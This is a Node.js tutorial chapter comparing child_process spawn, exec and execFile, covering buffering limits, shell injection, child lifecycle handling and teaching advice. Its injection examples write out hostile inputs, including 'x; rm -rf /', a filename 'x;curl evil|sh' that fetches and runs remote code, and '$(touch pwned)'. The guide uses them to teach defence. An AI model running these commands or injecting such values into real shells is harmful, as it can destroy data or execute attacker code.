## 1.1. spawn, exec, and execFile compared

### 1) **Three spawns, three shapes**

**Definition** — `child_process` offers three launch shapes: `spawn(cmd, args)` (streams — stdout/stderr as Readables; unbounded outputs, backpressure honored; the default for real work), `exec(cmd)` (buffers — collects output up to `maxBuffer`, default 1 MB; conveniences for small known outputs), `execFile(file, args)` (no shell — binary executed directly with argv; injection-safe by construction). Same lifecycle underneath (exit codes, signals, `error` on launch failure); different data shapes on top. Size and trust decide.

- **What problem it solves**: buffered giants (`exec` on a verbose build log — past 1 MB the child is killed with `maxBuffer exceeded`; the failure reads as tool breakage, the cause is API choice). Shell-quoted arguments (user input interpolated into `exec` strings — command injection; `spawn`/`execFile` argv arrays never reinterpret). Streamed trivia (spawn pipelines for 3-line outputs — ceremony without benefit; `exec` one-liners where outputs fit in memory with room).
- **Modern guidance** — default `spawn` (streams compose — pipeline child stdio like any stream; leaf 2.1 of Domain 03 applies unchanged). Use `exec` for small known outputs (version probes, git one-liners — raise `maxBuffer` deliberately when outputs grow). Prefer `execFile` over `exec` wherever no shell features needed (no globbing/pipes required — direct argv, no injection surface). Never buffer untrusted sizes (attacker-influenced outputs stream — caps before convenience).

```javascript
// GOOD: streamed spawn, buffered exec, shell-free execFile — runs on node v20.20.2
const { spawn, exec, execFile } = require('node:child_process');
const sp = spawn(process.execPath, ['--version']); let out = ''; // argv array (no shell, no injection)
sp.stdout.on('data', (c) => out += c); await new Promise((res) => sp.on('close', res));
console.log('spawn streamed:', out.trim().startsWith('v')); // true (v20.20.2 — streamed, bounded)
console.log('exec buffered:', (await new Promise((res) => exec('echo hi', (e, so) => res(so)))).trim() === 'hi'); // true (tiny output — buffering justified)
console.log('execFile direct:', (await new Promise((res) => execFile(process.execPath, ['--version'], (e, so) => res(so)))).trim().startsWith('v')); // true (no shell involved)
// BAD: `exec(userConfiguredCommand)` ("flexible tooling") —
// `userConfiguredCommand = 'x; rm -rf /'` — shell interprets; flexibility was injection
```

### 2) **Shells are opt-in risk**

**Definition** — `shell: true` (and `exec`'s implicit shell) route commands through `/bin/sh` (globbing, pipes, redirection, substitution — power with parsing; every metacharacter live). The risk: argument interpolation becomes code execution (filenames with `$(...)`, `;`, backticks — user-controlled strings evaluated). The safe shapes: argv arrays without shells (`spawn`/`execFile` default — arguments passed verbatim, never parsed), explicit escaping only where shells required (rare — `execFile` covers binaries; shell needed solely for pipelines the parent should build with `pipeline()` instead).

- **Why it hurts when missing (security)**: command injection (uploaded filename `x;curl evil|sh` — shell executes; the vulnerability class behind major breaches; spawned-with-shell file handlers the classic vector). Glob expansion surprises (`*` in arguments expanding to unintended files — destructive commands operating on the expansion). Platform variance (`/bin/sh` vs `cmd.exe` — quoting rules differ; shell scripts unportable by default; argv portable by construction).
- **Modern guidance** — never `shell: true` with interpolated input (constant commands only — and even then, prefer argv). Build pipelines in JS (`pipeline()` across spawned stdio — shell pipes without shell parsing; leaf 2.1 of Domain 03 composes). Audit `exec(` occurrences (every one justifies buffering + shell — most convert to `spawn`/`execFile`; the audit is a security control). Quote for the platform only when shells unavoidable (documented, reviewed, tested with hostile inputs — `$(touch pwned)` in the test suite).

```javascript
// GOOD: argv verbatim, shell uninvolved — runs on node v20.20.2 (hostile name inert)
const { execFile } = require('node:child_process'); const { writeFile } = require('node:fs/promises');
const hostile = '/tmp/nodeprobe/evil;touch pwned.txt'; // hostile filename (metacharacters live)
await writeFile('/tmp/nodeprobe/argv-echo.mjs', 'console.log(JSON.stringify(process.argv[2]))');
const seen = await new Promise((res) => execFile(process.execPath, ['/tmp/nodeprobe/argv-echo.mjs', hostile], (e, so) => res(so)));
console.log('verbatim:', seen.trim() === JSON.stringify(hostile)); // true (passed, never parsed — no shell, no injection)
// Equivalent exec() would evaluate the metacharacters (try it in a sandbox — then never ship it)
// BAD: `exec(`convert ${userFile} out.png`)` ("ImageMagick needs a shell") —
// userFile carries the shell; execFile + argv carries the filename — same tool, different blast radius
```

### 3) **Lifecycle owned end to end**

**Definition** — every child supervised: exit codes collected (`close` event — code + signal, distinguished: code for clean-ish exits, signal for kills), launch failures caught (`error` event — `ENOENT` binary-missing, `EACCES` permission; distinct from runtime failure — never conflated), strays timed out (`timeout` option or external timer — hung children killed, never adopted by init). Unsupervised children orphan (parent exits, child adopted — zombies accumulating; CI runners leaking processes per build; production boxes filling with the undead).

- **Why it matters (operations)**: orphan accumulation (unreaped children per request — PID exhaustion is the exotic one; memory/port exhaustion the routine). Unclassified exits (code 1 vs SIGTERM vs ENOENT — retried identically; transient rerun, permanent reconfigured, missing reinstalled — classification routes). Hanging builds (no timeout — CI waits the maximum; minutes billed per hang; timeouts convert hangs to failures in seconds).
- **Modern guidance** — listen `error` before spawning returns (launch failure races — handler attached synchronously; unguarded launch throws). Collect `close`, not just `exit` (stdio flushed at `close` — `exit` fires early; truncated output captured at the wrong event). Timeout every child (option or wrapper — hung work killed with a log line; orphan adoption monitored, never normal). Kill the tree on teardown (parent exit kills its children — `process.on('exit')` cleanup; containers SIGTERM the parent — children must not outlive it).

```javascript
// GOOD: launched guarded, collected at close, timed out — runs on node v20.20.2 (exit 0, ENOENT routed, timeout killed)
const { spawn } = require('node:child_process');
async function run(cmd, args, ms = 2000) { return new Promise((resolve) => { const child = spawn(cmd, args); // error attached synchronously (race-free)
  child.on('error', (e) => resolve(`launch-failed:${e.code}`)); // ENOENT/EACCES (distinct from runtime failure)
  const to = setTimeout(() => { child.kill('SIGKILL'); resolve('timed-out:killed'); }, ms); // strays never adopted
  child.on('close', (code, signal) => { clearTimeout(to); resolve(`closed:${code ?? signal}`); }); }); } // close (stdio flushed — not exit)
console.log(await run(process.execPath, ['--version'])); // closed:0 (clean)
console.log(await run('/nonexistent-binary-xyz')); // launch-failed:ENOENT (classified, not crashed)
console.log(await run(process.execPath, ['-e', 'setInterval(()=>{}, 1000)'], 100)); // timed-out:killed (strays reaped)
// BAD: `spawn(cmd)` with no handlers ("fire and forget") —
// launch failures throw unhandled, hangs linger, exits unlogged — forgotten children haunt every layer
```

### 4) **Common confusion**

- "`exec` buffers, so it's safer for big output" — inverted (`exec` *kills* past `maxBuffer` — big outputs need `spawn` streams; buffering is the danger, streaming the safety). Small outputs buffer; large outputs stream.
- "`shell: true` is fine for constant strings" — constants drift into interpolation (today's constant is tomorrow's template — the safe shape costs nothing; `execFile` even for constants — habit beats vigilance). Safe shapes by default, not by audit.
- "`exit` and `close` are interchangeable" — `exit` fires at termination (stdio may pend — truncated captures), `close` after streams flush (complete output — collect here). Early vs complete.
- "Killing the parent kills children" — orphans get adopted (init/container-runtime inherits — children outlive; explicit teardown kills the tree; `detached: false` default still orphans on parent crash). Trees killed deliberately, never incidentally.

### 5) **Performance note**

Spawn costs are process costs, priced per launch: fork+exec is milliseconds (fine per task — ruinous per request; process-per-request architectures die here — pools and workers serve hot paths). Buffered `exec` costs memory × output (1 MB default cap — raise deliberately, stream past comfort). Shell spawns add a `/bin/sh` per command (extra fork — measurable in tight loops; argv avoids it). Timeout timers cost nothing idle (one handle — the cheapest supervision). Optimize launch frequency first (reuse pools/workers — spawn rarely), output shape second (stream large — buffer tiny), shells never (argv always — security and speed agree for once).

### 6) **Mentor note**

Teach spawn shapes as a decision tree ("how big? who wrote the string? — size and trust route" until `exec(userInput)` *looks* hostile). Demo injection safely (hostile filename through `execFile` — inert; narrate the `exec` equivalent — evaluated; sandboxed, unforgettable). Demo the orphan (unreaped sleeper + parent exit — adopted; then supervised — reaped; lifecycle felt). Drill classification ("code 1, SIGTERM, ENOENT — retry, reconfigure, or reinstall?" — three exits, three remedies). Watch for the bufferer (`exec` on logs — fix with "how big can this get?") and the forgetter (bare `spawn` — fix with "who collects the exit?"). Review check: shapes routed by size/trust, shells absent with input, launches guarded, closes collected, timeouts set, juniors classify exits before retrying.
